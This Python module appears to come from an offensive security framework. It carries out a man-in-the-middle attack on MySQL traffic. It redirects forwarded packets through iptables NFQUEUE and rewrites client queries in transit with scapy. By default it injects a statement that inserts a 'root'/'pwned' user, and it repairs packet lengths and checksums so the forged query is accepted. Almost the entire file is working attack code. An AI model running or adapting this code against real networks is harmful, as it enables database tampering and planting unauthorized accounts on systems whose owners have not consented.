from termcolor import colored, cprint
from module import Module

import netfilterqueue
import os
import binascii
from scapy.all import *
import threading
from printib import * 
from subprocess import Popen, PIPE
import os
from pathlib import Path
import time

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "MySQL Manipulation",
                       "Description": "MySQL queries manipulation to modify data",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"query_modify": ["select", "query to be modified", True],
                   "query_spoof": ["insert into users (username,password) values ('root','pwned')", "query spoofing", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self.rs = False


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        options = self.options
        response_spoof = False

        def change_payload(packet, load):
            packet[Raw].load = load
            del packet[IP].len
            del packet[IP].chksum
            del packet[TCP].chksum
            return packet

        def put_size_hex(qspoof):
            hexQSpoofSize = hex(len(qspoof)+1)
            lenght = None
            hexQSpoofSize = hexQSpoofSize.split("0x")[1]
            #len=3 -> 1 hex
            if len(hexQSpoofSize) == 1:
                lenght = '0' + hexQSpoofSize + '0000'
            #len=4 -> 2 hex
            if len(hexQSpoofSize) == 2:
                lenght = hexQSpoofSize + '0000'
            #len=5 -> 3 hex
            if len(hexQSpoofSize) == 3:
                lenght = '0' + hexQSpoofSize[2] + hexQSpoofSize[:2] + '00'
            if len(hexQSpoofSize) == 4:
                lenght = hexQSpoofSize[2:] + hexQSpoofSize[:2] + '00'
            if len(hexQSpoofSize) == 5:
                lenght = '0' + hexQSpoofSize[4] + hexQSpoofSize[2:4] + hexQSpoofSize[:2]
            if len(hexQSpoofSize) == 6:
                lenght = hexQSpoofSize[4:6] + hexQSpoofSize[2:4] + hexQSpoofSize[:2]
            return lenght

        def mysql_spoof(packet):
            
            mysql_packet = IP(packet.get_payload())
            if mysql_packet.haslayer(TCP) and mysql_packet[TCP].sport == 3306:
                if mysql_packet.haslayer(Raw) and self.rs:
                    r = mysql_packet[Raw].load.decode('latin-1','ignore')
                    print_info("Response packet (hex): " + str(binascii.hexlify(bytes(r.encode('latin-1'))).decode('latin-1')))
                    print_info("Response packet (str):" + str(r))
                    self.rs = False
            if mysql_packet.haslayer(TCP) and mysql_packet[TCP].dport == 3306:
                if mysql_packet.haslayer(Raw):
                    load = mysql_packet[Raw].load.decode('latin-1','ignore')
                    query_modify = self.options["query_modify"][0]
                    query_spoof = self.options["query_spoof"][0]
                    if query_modify in str(load):
                        b = binascii.hexlify(mysql_packet[Raw].load).decode('latin-1','ignore')
                        qmodify = binascii.hexlify(bytes(query_modify.encode('latin-1'))).decode('latin-1')
                        qspoof = binascii.hexlify(bytes(query_spoof.encode('latin-1'))).decode('latin-1')
                        b = b.replace(qmodify,qspoof)
                        size = put_size_hex(query_spoof)
                        if size:
                            q = size + b[6:]
                            load = binascii.unhexlify(q.encode('latin-1'))
                            print_ok("Packet modified correctly")
                        else:
                            print_error("Packet error in Packet Lenght MySQL")
                    
                        if load != mysql_packet[Raw].load:
                            new_packet = change_payload(mysql_packet, load)
                            packet.set_payload(bytes(new_packet))
                            self.rs = True

            packet.accept()

        def nfqueuebind(queue):
            try:
                queue.bind(0, mysql_spoof)
                queue.run()
            except KeyboardInterrupt:
                print_info("Closing queue bind...")
                queue.unbind()

        def go(options):

            #Enable iptables rules
            print_info("Adding iptables rules")
            os.system("iptables -I FORWARD -j NFQUEUE")

            queue = netfilterqueue.NetfilterQueue()
            thread2 = threading.Thread(target=nfqueuebind,args=(queue,))   
            thread2.start()
            thread2.setDaemon = True

            t = threading.currentThread()
            while getattr(t, "do_run", True):
                time.sleep(1)
            
            print_info("Removing iptables rules")
            #Disable iptables rules
            os.system("iptables -D FORWARD -j NFQUEUE")
            queue.unbind()
        
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start() 
       
        super(CustomModule, self).run(t=thread1)
